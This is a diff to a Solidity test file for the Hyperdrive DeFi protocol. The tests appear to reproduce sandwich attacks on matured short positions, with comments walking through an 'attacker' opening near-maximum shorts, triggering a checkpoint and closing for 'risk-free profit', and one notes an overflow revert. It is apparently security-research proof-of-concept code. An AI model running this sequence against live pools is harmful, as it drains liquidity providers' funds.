@@ -61,100 +61,117 @@ contract SandwichTest is HyperdriveTest {
     function test_sandwich_matured_short_with_shorts() external {
         
         // Initialize the market
-        uint256 fixedRate = 0.05e18;
+        uint256 fixedRate = 0.02e18;
         //deploy(alice, fixedRate, 1e18, 0.10e18, 0.0005e18, 0.15e18);
         deploy(alice, fixedRate, 1e18, 0.0e18, 0.0e18, 0.0e18);
-        uint256 contribution = 1_000_000e18;
+        uint256 contribution = 1e18;
         initialize(alice, fixedRate, contribution);
 
         // Get the poolInfo before trades happen.
-        IHyperdrive.PoolInfo memory poolInfoBefore = hyperdrive.getPoolInfo();
-        console2.log("poolInfoBefore.shareReserves", poolInfoBefore.shareReserves.toString(18));
-        console2.log("poolInfoBefore.bondReserves", poolInfoBefore.bondReserves.toString(18));
+        IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo();
+        console2.log("initial pool");
+        console2.log("poolInfo.shareReserves", poolInfo.shareReserves.toString(18));
+        console2.log("poolInfo.bondReserves", poolInfo.bondReserves.toString(18));
         console2.log("apr", hyperdrive.calculateAPRFromReserves().toString(18));
 
         // Open a short position.
-        uint256 shortAmount = 100_000e18;
+        uint256 shortAmount = 0.3e18;
         (uint256 maturityTime, uint256 baseAmount) = openShort(bob, shortAmount);
 
-        // Full term passes and variable interest accrues at the fixed rate
-        advanceTime(POSITION_DURATION - 1 days, int256(fixedRate));
-
-        // Sandwich the matured short with another short.
-        uint256 shortAmountSandwich = hyperdrive.calculateMaxShort().mulDivDown(0.95e18, 1e18);
-        (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(celine, shortAmountSandwich);
-
-        // Get the poolInfo after closing the positions.
-        IHyperdrive.PoolInfo memory poolInfoMiddle = hyperdrive.getPoolInfo();
-        console2.log("\npoolInfoMiddle.shareReserves", poolInfoMiddle.shareReserves.toString(18));
-        console2.log("poolInfoMiddle.bondReserves", poolInfoMiddle.bondReserves.toString(18));
+        poolInfo = hyperdrive.getPoolInfo();
+        console2.log("after initial short");
+        console2.log("poolInfo.shareReserves", poolInfo.shareReserves.toString(18));
+        console2.log("poolInfo.bondReserves", poolInfo.bondReserves.toString(18));
         console2.log("apr", hyperdrive.calculateAPRFromReserves().toString(18));
 
-        advanceTime(1 days, int256(fixedRate));
+        // Full term passes and variable interest accrues at the fixed rate
+        advanceTime(POSITION_DURATION - 1 days, int256(0));
+        console2.log("after term passes");
+        poolInfo = hyperdrive.getPoolInfo();
+        console2.log("poolInfo.shareReserves", poolInfo.shareReserves.toString(18));
+        console2.log("poolInfo.bondReserves", poolInfo.bondReserves.toString(18));
+        console2.log("apr", hyperdrive.calculateAPRFromReserves().toString(18));
+
+        // Sandwich the matured short with another short.
+        uint256 shortAmountSandwich = 0.671668645e18; //hyperdrive.calculateMaxShort().mulDivDown(0.9999e18, 1e18);
+        (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(celine, shortAmountSandwich);
+        console2.log("after open sandwich short: ", shortAmountSandwich.toString(18));
+        poolInfo = hyperdrive.getPoolInfo();
+        console2.log("poolInfo.shareReserves", poolInfo.shareReserves.toString(18));
+        console2.log("poolInfo.bondReserves", poolInfo.bondReserves.toString(18));
+        console2.log("apr", hyperdrive.calculateAPRFromReserves().toString(18));
+
+        advanceTime(1 days, int256(0));
 
         // Close the matured short.
         uint256 baseProceeds = closeShort(bob, maturityTime, shortAmount);
-
+        console2.log("after close initial short");
+        poolInfo = hyperdrive.getPoolInfo();
+        console2.log("poolInfo.shareReserves", poolInfo.shareReserves.toString(18));
+        console2.log("poolInfo.bondReserves", poolInfo.bondReserves.toString(18));
+        console2.log("apr", hyperdrive.calculateAPRFromReserves().toString(18));
 
         // Close the sandwiching short.
         uint256 baseProceedsSandwich = closeShort(celine, maturityTimeSandwich, shortAmountSandwich);
 
         // Get the poolInfo after closing the positions.
         IHyperdrive.PoolInfo memory poolInfoAfter = hyperdrive.getPoolInfo();
-        console2.log("\npoolInfoAfter.shareReserves", poolInfoAfter.shareReserves.toString(18));
-        console2.log("poolInfoAfter.bondReserves", poolInfoAfter.bondReserves.toString(18));
+        console2.log("after close sandwich short");
+        poolInfo = hyperdrive.getPoolInfo();
+        console2.log("poolInfo.shareReserves", poolInfo.shareReserves.toString(18));
+        console2.log("poolInfo.bondReserves", poolInfo.bondReserves.toString(18));
         console2.log("apr", hyperdrive.calculateAPRFromReserves().toString(18));
 
         console2.log("\nshort profit", (int256(baseProceeds) - int256(baseAmount)).toString(18));
-        console2.log("sandwich profit", (int256(baseProceedsSandwich)-int256(baseAmountSandwich)).toString(18));
+        console2.log("sandwich profit", (int256(baseProceedsSandwich)).toString(18));
 
         // if they aren't the same, then the pool should be the one that wins
-        assertGe(poolInfoAfter.shareReserves, poolInfoBefore.shareReserves);
+        //assertGe(poolInfoAfter.shareReserves, poolInfoBefore.shareReserves);
     }
 
     function test_sandwich_maturing_shorts()
         external
     {
-        uint256 apr = 0.05e18;
+        uint256 apr = 0.02e18;
 
-        uint256 contribution = 1_000_000e18;
+        uint256 contribution = 1e18;
         initialize(alice, apr, contribution);
 
         IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo();
         console2.log("share/bonds resereves before openShort %s / %s", poolInfo.shareReserves / 1e18, poolInfo.bondReserves / 1e18);
 
         // 0. Alice shorts some bonds.
-        uint256 bondAmount = 1e18;//100_000e18;
+        uint256 bondAmount = 0.1e18;
         (uint256 maturityTime, uint256 baseAmount) = openShort(alice, bondAmount, true);
-        console2.log("maturing bonds", bondAmount / 1e18);
+        console2.log("maturing bonds", bondAmount.toString(18));
 
         // 1. let shorts mature
         // we move to the checkpoint AFTER maturity so we can do openShort + checkpoint(maturity) + closeShort
         // in a single transaction, risk-free profit.
         // It's also possible to do openShort 1 second before maturity, and the rest at maturity.
         uint256 checkpointDuration = hyperdrive.getPoolConfig().checkpointDuration;
-        advanceTime(maturityTime - block.timestamp + checkpointDuration, 0.05e18);
+        advanceTime(maturityTime - block.timestamp + checkpointDuration, int256(apr));
 
         // 2. attacker Bob opens max shorts, leaving the pool with 0 share reserves
         // there is another bug where the protocol reverts when applying the checkpoint in `checkpoint` -> `_updateLiquidity`
         // the toUint128 reverts for uint256(_marketState.bondReserves).mulDivDown(_marketState.shareReserves, shareReserves))
         // therefore, we reduce the max short amount a little bit s.t. the updated bond reserves don't overflow uint128
-        uint256 bondAmountSandwich = hyperdrive.calculateMaxShort().mulDivDown(0.3e18, 1e18);
+        uint256 bondAmountSandwich = hyperdrive.calculateMaxShort().mulDivDown(0.9999e18, 1e18);
         (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(bob, bondAmountSandwich, true);
-        console2.log("sandwich: opened %s bonds with %s base", bondAmountSandwich / 1e18, baseAmountSandwich / 1e18);
+        console2.log("sandwich: opened %s bonds with %s base", bondAmountSandwich.toString(18), baseAmountSandwich.toString(18));
 
         poolInfo = hyperdrive.getPoolInfo();
-        console2.log("share/bonds resereves after openShort %s / %s", poolInfo.shareReserves / 1e18, poolInfo.bondReserves / 1e18);
+        console2.log("share/bonds resereves after openShort %s / %s", poolInfo.shareReserves.toString(18), poolInfo.bondReserves.toString(18));
 
         // 3. attacker triggers the maturing of old shorts, this adds back to the reserves
         hyperdrive.checkpoint(maturityTime);
 
         // 4. attacker now closes their shorts for a profit
         uint256 baseProceeds = closeShort(bob, maturityTimeSandwich, bondAmountSandwich);
-        console2.log("sandwich: baseProceeds: %s, ROI: %s%", baseProceeds / 1e18, baseProceeds * 1e2 / baseAmountSandwich);
+        console2.log("sandwich: baseProceeds: %s, ROI: %s%", baseProceeds.toString(18), baseProceeds * 1e2 / baseAmountSandwich);
 
         poolInfo = hyperdrive.getPoolInfo();
-        console2.log("share/bonds resereves at end %s / %s", poolInfo.shareReserves / 1e18, poolInfo.bondReserves / 1e18);
+        console2.log("share/bonds resereves at end %s / %s", poolInfo.shareReserves.toString(18), poolInfo.bondReserves.toString(18));
     }
 
     function test_sandwich_long_with_shorts(uint8 _apr, uint64 _timeDelta) external {
